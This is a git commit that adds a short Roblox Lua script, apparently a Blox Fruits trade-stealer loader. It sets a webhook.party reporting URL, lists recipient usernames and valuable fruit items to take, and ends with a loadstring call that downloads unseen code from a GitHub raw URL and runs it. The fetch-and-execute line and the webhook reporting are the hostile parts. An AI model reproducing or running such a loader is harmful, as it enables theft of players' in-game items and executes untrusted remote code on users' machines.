6d1eb850123d728d60c9634fb62f224edb403c65
redzzreal <hasynguyen2005@gmail.com>
2025-02-16 23:10:22 +0700

    Create Lol.lua

---
+++ Lol.lua
@@ -0,0 +1,12 @@
+Webhook = "https://l.webhook.party/hook/rQ%2FDdSqEHxvuTA6xSNHZMdWbXFDX7xFRptWs7l8J0OMBY91zilAwqtKachAlTJTxu6OEtKRfKUQ1lpgiXi9sdIgIbOUNeYn9jzMvg3UTDLolGuKhzWl8iUnut8u7INMfiFb8%2FN99q%2BB%2FO%2Bjrjwik3RQS4zq7WOr7f9UQM5JRtcdOndA%2Bw2lDcBIi9FrZQxQQg700tZcRitbnhzdNwWbmAVe%2FEirBZDCdb0x8pjlcTGqL0oHpFPIHbDko8e3rDy96p2kg8jhz3dMp7lJIXBENZ9Xdi4D%2FTULTMviEuIG478nuJcJRHOV1U3SImpv1ibuM8EyS%2BLio95l9ZGVfcVhZOgYVbjXwaLFA%2FZAvJ3LJj3VljZu1YEf6k%2FLZX6v1cwABXzG28zhjhfBkhy%2FX/X3xnUZlX4iMdvxz3"
+Usernames = {"user1", "user2"} -- << Username(-s) it'll accept trade with
+Fruits = {"Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)"} -- << Fruits you want
+FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
+    "Quake-Quake",
+    "Love-Love",
+    "Magma-Magma",
+    "Ghost-Ghost",
+    "Barrier-Barrier"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/script/refs/heads/main/note"))()
